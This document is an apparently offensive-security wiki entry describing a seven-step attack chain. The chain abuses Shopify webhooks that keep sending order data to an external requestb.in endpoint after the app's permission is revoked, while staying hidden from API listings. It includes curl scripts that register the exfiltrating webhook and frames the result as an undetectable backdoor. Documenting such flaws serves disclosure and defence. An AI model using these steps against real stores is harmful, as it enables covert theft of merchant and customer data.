---
tags:
  - shopify
  - webhook
  - persistence
  - data-exfiltration
  - access-control
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/requestb-in]]'
tactics:
  - '[[Persistence]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Shopify-Private-App-and-Webhook]]'
  - '[[procedures/Revoke-Permissions-from-Shopify-App]]'
  - '[[procedures/Verify-Hidden-Webhook-in-Listing]]'
  - '[[procedures/Trigger-and-Confirm-Webhook-Exfiltration]]'
step_count: 7
techniques:
  - '[[Account Manipulation]]'
  - '[[Exfiltration Over Command and Control Channel]]'
updated_at: '2025-12-14T17:32:11.041Z'
description: >-
  Demonstrates how Shopify API webhooks continue to deliver sensitive data like
  order events even after revoking associated permissions, creating a hidden
  persistence mechanism for data exfiltration.
id: 4cba4092-d4a7-4c63-9158-8d11c3dcefd9
validated: true
mitre_tactics:
  - '[[Persistence]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Account Manipulation]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Shopify API Webhooks Persistence After Permission Revocation for Hidden Data Exfiltration

Multi-stage attack chain demonstrating a complete attack workflow exploiting Shopify's API webhook behavior to maintain hidden access for data exfiltration.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Account Compromise] --> B[Create App and Webhook]
    B --> C[Revoke Permissions]
    C --> D[Verify Hidden Webhook]
    D --> E[Trigger Event]
    E --> F[Confirm Exfiltration]
    F --> G[Persistent Access Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#e67e22
    style F fill:#1abc9c
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/requestb-in]]

### Target Environment

- Shopify merchant account with admin access
- Required services: Shopify Admin API, Private Apps, Webhooks, Orders
- Network access: Internet connectivity to Shopify API endpoints and external webhook receiver

### Initial Access Requirements

- Compromised or legitimate Shopify admin credentials
- API token with initial permissions to create apps and webhooks
- External endpoint (e.g., requestb.in) to receive webhook payloads

## Detailed Attack Procedures

### Step 1: Log into the Shopify Account
procedure: [[procedures/Create-Shopify-Private-App-and-Webhook]]

**Objective**: Gain access to the Shopify admin dashboard to set up the initial app and webhook.

**Instructions**: Use provided credentials to log into the Shopify admin panel and navigate to the private apps section.

**Expected Output**: Successful login and access to /admin/apps/private/.

**Success Indicators**:
- Admin dashboard loaded
- Private apps management page accessible

### Step 2: Create Private App with Read Permissions and Webhook
procedure: [[procedures/Create-Shopify-Private-App-and-Webhook]]

**Objective**: Establish a webhook that subscribes to sensitive events like order creation using read permissions.

**Instructions**: In the private apps page, create a new app granting read access to orders. Then, use [[commands/create-shopify-webhook]] to register the webhook for orders/create events pointing to an external endpoint.

```bash
#!/bin/bash
creds=`cat ../creds`

curl -X POST "$creds/admin/webhooks.json" \
  -H "Content-Type: application/json" \
  -d @- << EOD
{
  "webhook": {
    "topic": "orders\\create",
    "address": "http://requestb.in/17m30us1",
    "format": "json"
  }
}
EOD

printf "\n"
```

**Expected Output**: JSON response with webhook ID confirming creation.

**Success Indicators**:
- Webhook created successfully
- Permissions active for orders read

### Step 3: Remove Read Orders Permission from the App
procedure: [[procedures/Revoke-Permissions-from-Shopify-App]]

**Objective**: Revoke the permission that should theoretically disable the webhook, but it persists.

**Instructions**: Return to the app administration page and edit the private app to remove read access to orders.

**Expected Output**: Permissions updated in the UI, no errors.

**Success Indicators**:
- Read orders permission revoked
- App saved successfully

### Step 4: Retrieve All Webhooks to Confirm Invisibility
procedure: [[procedures/Verify-Hidden-Webhook-in-Listing]]

**Objective**: Demonstrate that the webhook is no longer visible in API listings due to insufficient permissions.

**Instructions**: Execute [[commands/list-shopify-webhooks]] to query the webhooks endpoint.

```bash
#!/bin/bash
creds=`cat ../creds`

curl "$creds/admin/webhooks.json?since=1" \
  -H "Content-Type: application/json" 

printf "\n"
```

**Expected Output**: Empty array [] in the response.

**Success Indicators**:
- No webhooks listed despite existence
- API response hides the webhook

### Step 5: Create an Order to Trigger the Webhook
procedure: [[procedures/Trigger-and-Confirm-Webhook-Exfiltration]]

**Objective**: Generate an event that should fire the hidden webhook.

**Instructions**: Navigate to /admin/orders in the Shopify admin and create a new test order.

**Expected Output**: Order created successfully in the dashboard.

**Success Indicators**:
- New order appears in orders list
- Event triggered (webhook should fire invisibly)

### Step 6: Verify Webhook Delivery to External Endpoint
procedure: [[procedures/Trigger-and-Confirm-Webhook-Exfiltration]]

**Objective**: Confirm that sensitive order data is still exfiltrated despite permission revocation.

**Instructions**: Check the external endpoint (e.g., requestb.in) for incoming requests containing the order payload.

**Expected Output**: HTTP POST request received with JSON order data.

**Success Indicators**:
- Webhook payload delivered
- Sensitive data (e.g., order details) visible externally

### Step 7: Establish Persistent Backdoor
procedure: [[procedures/Trigger-and-Confirm-Webhook-Exfiltration]]

**Objective**: Validate the webhook as a subtle, undetectable backdoor for ongoing data access.

**Instructions**: Repeat order creation multiple times and monitor the endpoint to confirm consistent delivery without detection via API or UI.

**Expected Output**: Multiple payloads received over time.

**Success Indicators**:
- Undetected persistence
- Continuous exfiltration possible

## Attack Chain Summary

### Key Achievements

1. Created a functional webhook tied to read permissions
2. Revoked permissions without disabling the webhook
3. Confirmed invisibility in listings and UI
4. Demonstrated ongoing data exfiltration via event triggers

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Manipulation]] Account Manipulation
- [[Exfiltration Over Command and Control Channel]] Exfiltration Over C2 Channel

### MITRE ATT&CK Tactics

- [[Persistence]] Persistence
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
